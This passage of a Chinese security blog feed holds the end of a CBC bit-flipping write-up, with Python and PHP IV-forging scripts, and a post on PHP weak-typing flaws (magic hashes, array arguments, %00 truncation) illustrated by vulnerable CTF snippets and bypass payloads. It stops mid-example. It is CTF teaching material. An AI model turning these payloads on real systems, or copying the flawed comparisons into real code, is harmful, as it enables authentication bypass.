class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";s:2:"</span>bb<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure></p><p>发现序列完全被破坏, 反序列化失败。 原因是第一个块数据（16字节）被破坏了。因为要 username 要等于 admin 所以不能利用文章（0x03一个练习中）里的说的填充字符。<br>又因为是第一个块数据被破坏，第一个块数据是和 IV 有关，所以只要将在 CBC 字符翻转攻击，得到新的 IV 就可以修复第一块数据, 我们将 IV 值异或掉 data 的前16字节（用返回的 Base64 解码的明文信息 data），再异或我们要明文<br>代码如下：</p><p>python版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64,urllib2</span><br><span class="line">first_16Bytes=<span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line">data=base64.b64decode(urllib2.unquote(<span class="string">"GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI6ImJiIjt9"</span>))</span><br><span class="line">iv=base64.b64decode(urllib2.unquote(<span class="string">"KYVIlJkfaja2cM8pENnLDg%3D%3D"</span>))</span><br><span class="line">newiv=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(16):</span><br><span class="line">    newiv+=chr(ord(first_16Bytes[i])^ord(iv[i])^ord(data[i])) </span><br><span class="line"><span class="built_in">print</span> urllib2.quote(base64.b64encode(newiv))</span><br></pre></td></tr></table></figure></p><p>php版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$first_16Bytes</span>=<span class="string">'a:2:&#123;s:8:"userna'</span>;</span><br><span class="line"><span class="variable">$cipher</span> = base64_decode(<span class="string">'GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI6ImJiIjt9'</span>);</span><br><span class="line"><span class="variable">$iv</span>=base64_decode(<span class="string">'KYVIlJkfaja2cM8pENnLDg=='</span>);</span><br><span class="line"><span class="variable">$newiv</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;16;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$newiv</span>.=chr(ord(<span class="variable">$first_16Bytes</span>[<span class="variable">$i</span>])^ord(<span class="variable">$iv</span>[<span class="variable">$i</span>])^ord(<span class="variable">$cipher</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newiv</span> = base64_encode(<span class="variable">$newiv</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newiv</span>;</span><br><span class="line"><span class="variable">$newiv</span> = urlencode(<span class="variable">$newiv</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newiv</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CBC 字节翻转攻击原理和例题&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>php弱类型漏洞</title>
    <link href="http://archimesan.me/2017/12/21/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/"/>
    <id>http://archimesan.me/2017/12/21/php弱类型漏洞/</id>
    <published>2017-12-21T03:10:57.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>常见的 php 弱类型归纳</p><a id="more"></a><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>php中有两种比较的符号 == 与 ===<br>$a = $b ;<br>$a===$b ;<br>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。<br>类型转换是无法避免的问题。例如需要将 GET 或者是 POST 的参数转换为 int 类型，或者是两个变量不匹配的时候，PHP 会自动地进行变量转换。但是 PHP 是一个弱类型的语言，导致在进行类型转换的时候会存在很多意想不到的问题。</p><h1 id="常见的漏洞"><a href="#常见的漏洞" class="headerlink" title="常见的漏洞"></a>常见的漏洞</h1><h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><p>在 $a==$b 的比较中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=null;<span class="variable">$b</span>=flase ; //<span class="literal">true</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">''</span>;<span class="variable">$b</span>=null; //<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>这样的例子还有很多，这种比较都是相等。<br>使用比较操作符的时候也存在类型转换的问题，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0==<span class="string">'0'</span> //<span class="literal">true</span></span><br><span class="line">0 == <span class="string">'abcdefg'</span> //<span class="literal">true</span></span><br><span class="line">0 === <span class="string">'abcdefg'</span> //<span class="literal">false</span></span><br><span class="line">1 == <span class="string">'1abcdef'</span> //<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含 ‘.’,’e’,’E’ 并且其数值值在整形的范围之内，该字符串被当作 int 来取值，其他所有情况下都被作为 float 来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为 0。<br>Example1：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span>=1 + <span class="string">"10.5"</span>; // <span class="variable">$test</span>=11.5(<span class="built_in">float</span>)</span><br><span class="line"><span class="variable">$test</span>=1+<span class="string">"-1.3e3"</span>; //<span class="variable">$test</span>=-1299(<span class="built_in">float</span>)</span><br><span class="line"><span class="variable">$test</span>=1+<span class="string">"bob-1.3e3"</span>;//<span class="variable">$test</span>=1(int)</span><br><span class="line"><span class="variable">$test</span>=1+<span class="string">"2admin"</span>;//<span class="variable">$test</span>=3(int)</span><br><span class="line"><span class="variable">$test</span>=1+<span class="string">"admin2"</span>;//<span class="variable">$test</span>=1(int)</span><br></pre></td></tr></table></figure></p><p>Example2:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">"THIS IS FLAG"</span>; </span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == <span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>]) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (0 &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, <span class="variable">$password</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Wrong Format'</span>; </span><br><span class="line">        <span class="built_in">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">while</span> (TRUE) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$reg</span> = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>; </span><br><span class="line">        <span class="keyword">if</span> (6 &gt; preg_match_all(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>)) </span><br><span class="line">            <span class="built_in">break</span>; </span><br><span class="line">        <span class="variable">$c</span> = 0; </span><br><span class="line">        <span class="variable">$ps</span> = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); </span><br><span class="line">        foreach (<span class="variable">$ps</span> as <span class="variable">$pt</span>) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:<span class="variable">$pt</span>:]]+/"</span>, <span class="variable">$password</span>)) </span><br><span class="line">                <span class="variable">$c</span> += 1; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$c</span> &lt; 3) <span class="built_in">break</span>; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == <span class="variable">$password</span>) <span class="built_in">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">'Wrong password'</span>; </span><br><span class="line">        <span class="built_in">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload: password=42.00e+0000000000</span><br></pre></td></tr></table></figure></p><h2 id="Hash比较"><a href="#Hash比较" class="headerlink" title="Hash比较"></a>Hash比较</h2><p>在进行 hash 比较的时候也会存在问题。如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"0e132456789"</span>==<span class="string">"0e7124511451155"</span> //<span class="literal">true</span></span><br><span class="line"><span class="string">"0e123456abc"</span>==<span class="string">"0e1dddada"</span> //<span class="literal">false</span></span><br><span class="line"><span class="string">"0e1abc"</span>==<span class="string">"0"</span>  //<span class="literal">true</span></span><br><span class="line">QNKCDZO==0e830400451993494058024219903391</span><br><span class="line">s878926199a==0e545993274517709034328855841020</span><br><span class="line">s155964671a==0e342768416822451524974117254469</span><br><span class="line">s214587387a==0e848240448830537924465865611904</span><br></pre></td></tr></table></figure></p><p>在进行比较运算时，如果遇到了 0e\d+ 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 0e\d+ 这种模式就不会相等。</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$md51</span> = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$md52</span> = @md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="string">'QNKCDZO'</span> &amp;&amp; <span class="variable">$md51</span> == <span class="variable">$md52</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="built_in">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload:  http://chinalover.sinaapp.com/web19/?a=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="十六进制转换"><a href="#十六进制转换" class="headerlink" title="十六进制转换"></a>十六进制转换</h2><p>还存在一种十六进制余字符串进行比较运算时的问题。<br>例子如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"123456"</span> //<span class="literal">true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==123456 //<span class="literal">true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"1e240"</span> //<span class="literal">false</span></span><br></pre></td></tr></table></figure></p><p>当其中的一个字符串是 0x 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，0x1240解析成为十进制就是123456，所以与 int 类型和 string 类型的 123456 比较都是相等。<br>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="keyword">function</span> noother_says_correct(<span class="variable">$number</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$one</span> = ord(<span class="string">'1'</span>);</span><br><span class="line">        <span class="variable">$nine</span> = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="variable">$digit</span> = ord(<span class="variable">$number</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="built_in">return</span> <span class="variable">$number</span> == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct(<span class="variable">$_GET</span>[<span class="string">'key'</span>]))</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload:  http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</span><br></pre></td></tr></table></figure></p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>常见的转换主要就是 int 转换为 string，string 转换为 int。<br>int 转 string：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var</span> = 5;</span><br><span class="line">方式1：<span class="variable">$item</span> = (string)<span class="variable">$var</span>;</span><br><span class="line">方式2：<span class="variable">$item</span> = strval(<span class="variable">$var</span>);</span><br></pre></td></tr></table></figure></p><p>string 转 int：intval() 函数。(取整函数)<br>对于这个函数，可以先看2个例子。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(<span class="string">'2'</span>)) //2</span><br><span class="line">var_dump(intval(<span class="string">'3abcd'</span>)) //3</span><br><span class="line">var_dump(intval(<span class="string">'abcd'</span>)) //0</span><br></pre></td></tr></table></figure></p><p>说明 intval() 转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。<br>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  <span class="variable">$id</span> = intval(<span class="variable">$_GET</span>[id]);</span><br><span class="line">  <span class="variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='<span class="variable">$id</span>'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_GET</span>[id]==1024) &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="variable">$query</span>[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Payload:   http://chinalover.sinaapp.com/web11/sql.php?id=1024.1</span><br></pre></td></tr></table></figure></p><h2 id="内置函数的参数的松散性"><a href="#内置函数的参数的松散性" class="headerlink" title="内置函数的参数的松散性"></a>内置函数的参数的松散性</h2><p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。</p><h3 id="md5、sha1-绕过"><a href="#md5、sha1-绕过" class="headerlink" title="md5、sha1 绕过"></a>md5、sha1 绕过</h3><p>md5、sha1 函数无法处理数组，处理结果都是 null<br>Example1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'a'</span>] != <span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'b'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload: a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></p><p>Example2：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'v1'</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">'v2'</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">'v1'</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; md5(<span class="variable">$v1</span>) == md5(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload: v1[]=1&amp;v2[]=2&amp;v3[]=3</span><br></pre></td></tr></table></figure></p><h3 id="ereg-函数漏洞：00-截断-00"><a href="#ereg-函数漏洞：00-截断-00" class="headerlink" title="ereg 函数漏洞：00 截断 %00"></a>ereg 函数漏洞：00 截断 %00</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg(string pattern, string string, array [regs]);</span><br></pre></td></tr></table></figure><p>本函数以 pattern 的规则来解析比对字符串 string。比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。</p><p>Example1：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>,<span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)    </span><br><span class="line">       &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">Payload:  password=1e8%00*-*</span><br></pre></td></tr></table></figure></p><p>Example2：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br><span class="line">    <span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'nctf'</span>]) === FALSE)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)   </span><br><span class="line">            die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">Payload1: nctf=1%00%23biubiubiu   <span class="comment">#要改成 %23 不然不行</span></span><br><span class="line">Payload2: nctf[]=1  因为ereg strpos 处理数组返回都是 null</span><br></pre></td></tr></table></figure></p><h3 id="strcmp-绕过"><a href="#strcmp-绕过" class="headerlink" title="strcmp() 绕过"></a>strcmp() 绕过</h3><p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>5.2 中是将两个参数先转换成 string 类型。<br>5.3.3 以后，当比较数组和字符串的时候，返回是 null。<br>5.5 中如果参数不是 string 类型，直接 return 了<br>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="variable">$flag</span>) == 0)  </span><br><span class="line">        die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="built_in">print</span> <span class="string">'Invalid password'</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Payload: password[]=1   strcmp 处理数组直接返回 null</span><br></pre></td></tr></table></figure></p><h3 id="switch-绕过"><a href="#switch-绕过" class="headerlink" title="switch() 绕过"></a>switch() 绕过</h3><p>如果 switch 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> =<span class="string">"2abc"</span>;</span><br><span class="line">switch (<span class="variable">$i</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> 0:</span><br><span class="line"><span class="keyword">case</span> 1:</span><br><span class="line"><span class="keyword">case</span> 2:</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</span><br><span class="line"> <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> 3:</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">"i is 3"</span>;</span><br></pre></td></tr></table></figure></p><p>这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 $i 进行了类型转换，转换结果为 2。</p><h3 id="json-绕过"><a href="#json-绕过" class="headerlink" title="json() 绕过"></a>json() 绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = 